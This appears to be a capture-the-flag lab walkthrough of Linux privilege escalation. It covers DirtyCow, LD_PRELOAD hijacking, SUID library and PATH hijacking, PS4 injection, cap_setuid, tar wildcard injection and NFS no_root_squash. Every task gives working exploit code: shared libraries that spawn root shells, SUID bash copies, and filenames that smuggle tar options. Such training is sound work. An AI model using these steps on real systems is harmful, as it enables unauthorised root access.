## 🧨 Task 3: DirtyCow (Kernel Exploit)

### What is DirtyCow?
- **CVE-2016-5195** – race condition in the Linux kernel's memory subsystem.
- Allows a local user to gain **write access to read-only memory mappings**.
- Exploitable on **Linux kernels 2.6.22 through 4.8.3**.
- Named "DirtyCow" because the exploit uses a race condition to "dirty" the copy-on-write (COW) mechanism.

### How It Works (Simplified)
1. A process maps a file (e.g., `/etc/passwd`) as read-only.
2. The exploit repeatedly writes to the mapped memory while another thread triggers the race condition.
3. The kernel incorrectly grants write access to the read-only mapping.
4. The attacker can now overwrite protected files, such as `/etc/passwd` or the `passwd` binary itself.

### Detection
```bash
# Run the Linux Exploit Suggester
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```
- Output will show the system is vulnerable to DirtyCow.

### Exploitation Steps
```bash
# Compile the exploit
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w

# Run it (takes 1-2 minutes)
./c0w

# After the exploit completes, run passwd to verify
passwd

# Check your user ID
id
```

**What happened?** The exploit overwrote the `passwd` binary with a version that gives you root privileges when executed. You now have root access.

## 🔄 Task 10: LD_PRELOAD

### What is LD_PRELOAD?
- **LD_PRELOAD** is an environment variable that tells the dynamic linker to load a specified shared library **before all others**.
- This allows you to override functions from standard libraries.
- If `sudo` preserves the `LD_PRELOAD` environment variable (check `env_keep` in `/etc/sudoers`), you can hijack any program run with sudo.

### How the Exploit Works
1. Create a shared library with a function that gets executed on load (e.g., `_init()`).
2. This function runs code with **root privileges**.
3. Set `LD_PRELOAD` to your malicious library and run any sudo-allowed program.

### Exploitation Steps
```bash
# Create malicious C code
cat > /tmp/x.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# Compile as shared library
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/x.so apache2
```

**Why `unsetenv("LD_PRELOAD")`?** Removes the environment variable so the spawned shell doesn't inherit it (clean exit).

**Why `-nostartfiles`?** Prevents standard startup files from running; ensures `_init()` is called first.

## 🧩 Task 11: SUID Shared Library (Missing .so)

### Detection
```bash
# Find SUID binaries
find / -type f -perm -04000 -ls 2>/dev/null

# Trace the SUID binary to find missing libraries
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

**What to look for:** A `.so` file that the binary tries to load from a **writable directory**.

### Exploitation
```bash
# Create the missing directory
mkdir /home/user/.config

# Create malicious shared library
cat > /home/user/.config/libcalc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF

# Compile the shared library
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

# Run the SUID binary
/usr/local/bin/suid-so

# Check your privileges
id
```

**Why this works:** The SUID binary tries to load `libcalc.so` from `/home/user/.config/` but the directory doesn't exist. Since `/home/user/` is writable, you can create the directory and the malicious library. When the SUID binary runs, it loads your library (with root privileges).

## 🔧 Task 12: SUID (PATH Hijacking)

### Detection
```bash
# Find SUID binaries
find / -type f -perm -04000 -ls 2>/dev/null

# Check what functions the binary uses

```

**Look for:** The binary calls a command **without a full path** (e.g., `service` instead of `/usr/sbin/service`).

### Exploitation
```bash
# Create a malicious program named 'service'
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service

# Modify PATH to prioritize /tmp
export PATH=/tmp:$PATH

# Run the SUID binary
/usr/local/bin/suid-env

# Check your privileges
id
```

**Why this works:** The SUID binary runs `service` (no full path). By placing a malicious `service` binary in `/tmp` and adding `/tmp` to the front of `PATH`, the binary runs your version instead of the real one—with root privileges.

## 🔧 Task 13: SUID (Function Hijacking)

### Detection
```bash
# Find SUID binaries
find / -type f -perm -04000 -ls 2>/dev/null

# Check what functions the binary uses
strings /usr/local/bin/suid-env2
```

### Exploitation Method 1 (Function Override)
```bash
# Override the /usr/sbin/service function
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service

# Run the SUID binary
/usr/local/bin/suid-env2
```

### Exploitation Method 2 (xtrace/PS4 Injection)
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

**Why Method 2 works:**
- `SHELLOPTS=xtrace` enables shell debugging output.
- `PS4` is the prompt printed before each trace line.
- Bash evaluates `PS4` **every time it's printed**, allowing command execution.
- The command copies `/bin/bash`, sets SUID, and spawns a root shell.

### Task Answer
- Last line of `strings /usr/local/bin/suid-env2` → (lab specific)

## 🎯 Task 14: Capabilities (cap_setuid)

### What are Linux Capabilities?
- Capabilities break down root privileges into **individual units**.
- A binary can have specific capabilities without being fully SUID root.
- `cap_setuid` allows a process to change its UID (setuid) to any value.

### Detection
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
```

### Exploitation
```bash
# Python 2.6 has cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Why this works:** Python 2.6 has the `cap_setuid` capability, meaning it can call `setuid(0)` to become root. The Python interpreter itself runs with this capability.

## 📦 Task 16: Cron Jobs (Wildcard Injection - tar)

### Detection
```bash
# Check cron jobs
cat /etc/crontab

# Check the script
cat /usr/local/bin/compress.sh
```

**Look for:** A `tar` command using a wildcard (`*`) like: `tar -czf /backup/backup.tgz *`

### Why Wildcard Injection Works
- `tar` has command-line options that can be passed **via filenames**.
- When `tar *` runs, it expands to all filenames in the directory.
- If a filename is `--checkpoint=1`, `tar` interprets it as an option, not a file.
- This allows executing arbitrary commands via `--checkpoint-action`.

### Exploitation
```bash
# Create the payload script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh

# Create the tar checkpoint files
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh

# Wait for cron to execute (1 minute)

# Run the SUID bash
/tmp/bash -p
```

**What's happening:** `tar` sees `--checkpoint=1` and `--checkpoint-action=exec=sh runme.sh` as command-line options, not files. This executes `runme.sh` with root privileges.

## 🖥️ Task 18: NFS (no_root_squash)

### What is NFS?
- Network File System – allows remote mounting of directories.
- `no_root_squash` means remote root users **keep their root privileges**.

### Detection
```bash
# Check NFS exports
cat /etc/exports
```

**Look for:** `no_root_squash` option (e.g., `/tmp *(rw,no_root_squash)`)

### Exploitation
```bash
# On attacker machine:
# Check exported shares
showmount -e 10.144.163.246

# Mount the share locally
mkdir /tmp/1
mount -o rw,vers=2 10.144.163.246:/tmp /tmp/1

# Create a SUID root binary on the mount
cat > /tmp/1/x.c << 'EOF'
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x

# On target machine:
# Execute the SUID binary
/tmp/x

# Check your privileges
id
```

**Why this works:** The NFS share is mounted with `no_root_squash`, meaning files created as root on the client are owned by root on the server. When you set the SUID bit on the binary, it runs as root on the target machine.
